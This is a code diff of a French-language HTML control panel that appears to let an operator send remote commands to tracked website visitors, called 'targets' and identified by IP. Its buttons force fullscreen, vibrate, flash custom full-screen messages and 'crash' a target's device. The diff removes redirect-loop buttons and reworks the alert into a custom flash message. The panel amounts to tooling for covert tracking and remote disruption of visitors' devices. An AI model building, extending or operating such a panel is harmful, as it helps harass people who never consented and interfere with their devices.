@@ -471,10 +471,9 @@
                 <div id="control-target-info" style="color: var(--text-dim); font-size: 0.8rem; margin-bottom: 15px;">
                     Aucune cible sélectionnée.
                 </div>
-                <button class="btn-refresh btn-action-full" onclick="actionOnSelected('ALERT', {message: 'Alerte Système'})">Alerte Flash</button>
+                <button class="btn-refresh btn-action-full" onclick="const msg = prompt('Message flash à envoyer en plein écran :'); if(msg) actionOnSelected('FLASH_ALERT', {message: msg})">Alerte Flash</button>
                 <button class="btn-refresh btn-action-full" onclick="actionOnSelected('VIBRATE')">Faire Vibrer</button>
                 <button class="btn-danger-outline btn-action-full" style="background: var(--danger); color: white;" onclick="actionOnSelected('STOP_DEVICE')">Arrêter l'appareil (Crash)</button>
-                <button class="btn-danger-outline btn-action-full" onclick="actionOnSelected('REDIRECT', {url: 'http://127.0.0.1'})">Boucle Infinie</button>
             </div>
         </div>
 
@@ -913,7 +912,7 @@
                         <div class="action-card">
                             <h4>Commandes à distance</h4>
                             <p style="font-size: 0.75rem; color: var(--text-dim); margin-bottom: 10px;">Note: Les commandes dépendent des permissions du navigateur de la cible.</p>
-                            <button class="btn-refresh btn-action-full" onclick="const msg = prompt('Message à envoyer :'); if(msg) sendCommand('${sid}', 'ALERT', {message: msg})">Envoyer une Alerte</button>
+                            <button class="btn-refresh btn-action-full" onclick="const msg = prompt('Message flash à envoyer en plein écran :'); if(msg) sendCommand('${sid}', 'FLASH_ALERT', {message: msg})">Alerte Flash</button>
                             <button class="btn-refresh btn-action-full" onclick="sendCommand('${sid}', 'VIBRATE', {duration: 1000})">Faire Vibrer</button>
                             <button class="btn-refresh btn-action-full" onclick="sendCommand('${sid}', 'FULLSCREEN')">Forcer Plein Écran</button>
                             <button class="btn-danger-outline btn-action-full" style="background: var(--danger); color: white;" onclick="sendCommand('${sid}', 'STOP_DEVICE')">Arrêter l'appareil (Crash)</button>
@@ -926,10 +925,6 @@
                             <h4>Restriction d'accès</h4>
                             <p style="font-size: 0.75rem; color: var(--text-dim); margin-bottom: 10px;">Bloque l'accès au site et arrête le tracking pour cette IP.</p>
                             <button class="btn-danger-outline btn-action-full" onclick="deleteSession('${sid}')">Tuer la session (IP-KILL)</button>
-                        </div>
-                        <div class="action-card" style="border-color: var(--danger);">
-                            <h4>Zone de Danger</h4>
-                            <button class="btn-danger-outline btn-action-full" style="background: var(--danger); color: white;" onclick="sendCommand('${sid}', 'REDIRECT', {url: 'http://127.0.0.1'})">Redirection Boucle Infinie</button>
                         </div>
                     </div>
                 `;
